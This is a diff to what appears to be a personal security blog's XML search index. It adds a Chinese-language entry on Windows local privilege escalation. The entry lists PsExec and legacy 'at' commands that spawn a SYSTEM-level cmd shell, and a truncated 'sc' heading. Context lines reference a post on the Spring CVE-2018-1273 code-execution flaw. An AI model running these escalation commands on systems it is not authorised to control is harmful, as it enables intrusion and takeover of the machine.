@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>本地提权——AT&amp;SC&amp;PS提权</title>
+      <link href="2023/04/08/AT-SC-PS%E6%8F%90%E6%9D%83/"/>
+      <url>2023/04/08/AT-SC-PS%E6%8F%90%E6%9D%83/</url>
+      
+        <content type="html"><![CDATA[<h3 id="ps提权"><a href="#ps提权" class="headerlink" title="ps提权"></a>ps提权</h3><p>下载PsTools</p><p>适用版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -accepteual -s -i -d cmd.exe</span><br></pre></td></tr></table></figure><h3 id="at-提权"><a href="#at-提权" class="headerlink" title="at 提权"></a>at 提权</h3><p>适用版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at 11:08 &#x2F;interactive cmd</span><br></pre></td></tr></table></figure><h3 id="sc提权"><a href="#sc提权" class="headerlink" title="sc提权"></a>sc提权</h3>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>spring代码执行(CVE-2018-1273)</title>
       <link href="2023/04/07/spring%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2018-1273/"/>
       <url>2023/04/07/spring%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2018-1273/</url>
